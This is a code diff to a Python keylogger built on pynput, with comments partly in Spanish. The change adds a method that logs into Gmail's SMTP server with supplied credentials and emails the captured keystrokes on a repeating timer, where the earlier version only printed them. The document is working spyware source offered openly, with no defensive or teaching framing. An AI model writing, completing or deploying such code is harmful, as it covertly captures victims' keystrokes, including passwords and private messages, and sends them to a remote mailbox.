@@ -1,14 +1,26 @@
 #! usr/bin/env/python
 
+
 import pynput.keyboard
 import threading
+import smtplib
 
 log = ''
 
 class keylogger:
 
-    def __init__(self):
-        self.log = ""
+    def __init__(self,email, password, time):
+        self.log = "Starting excecution"
+        self.email = email
+        self.password = password
+        self.time = time
+
+    def send_mail(self, email, password, log):
+        server = smtplib.SMTP("smtp.gmail.com", 587)  # Crear una instancia del servidor smpt y el puerto en que corre
+        server.starttls()  # inicia el servidor smtp
+        server.login(self.email, self.password)  # inicia sesion en el servidor SMTP
+        server.sendmail(self.email, self.email, self.log)  # 1from, 2to, 3content of the email
+        server.quit()
 
     def append_log(self,string):
         self.log = self.log + string
@@ -24,9 +36,9 @@ class keylogger:
         self.append_log(current_key)
 
     def report(self):
-        print(self.log)
-        self.log = ""
-        timer = threading.Timer(10, self.report)
+        self.send_mail(self.email, self.password, self.log)
+        self.log = "\n\n"
+        timer = threading.Timer(self.time, self.report)
         timer.start()
 
     def start(self):
